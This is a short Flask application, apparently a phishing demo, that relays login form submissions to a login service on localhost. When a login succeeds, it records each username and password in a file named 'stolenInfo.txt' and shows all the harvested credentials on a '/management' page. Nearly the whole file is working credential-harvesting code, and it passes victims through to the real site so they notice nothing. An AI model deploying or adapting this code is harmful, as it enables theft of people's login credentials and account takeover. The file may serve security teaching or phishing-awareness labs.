from flask import Flask, Markup, render_template, request, redirect
import requests

app = Flask(__name__)

@app.route("/", methods = ['GET', 'POST'])
def main():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        response = requests.post("http://localhost:52995", data = {'username': username, 'password': password, 'submit': 'submit'})
        if response.status_code == 302:
            with open('./stolenInfo.txt', 'a+') as f:
                f.write(f"Username: {username}, password: {password}\n")

            return redirect("http://localhost:52995/loggedIn", 301)
    
    return render_template("index.html")

@app.route("/management", methods=['GET'])
def management():
    up = ""
    with open('./stolenInfo.txt', 'r') as f:
        up = ' '.join(f.readlines())
    return render_template("management.html", up = up)


if __name__ == "__main__":
    app.run(debug = True)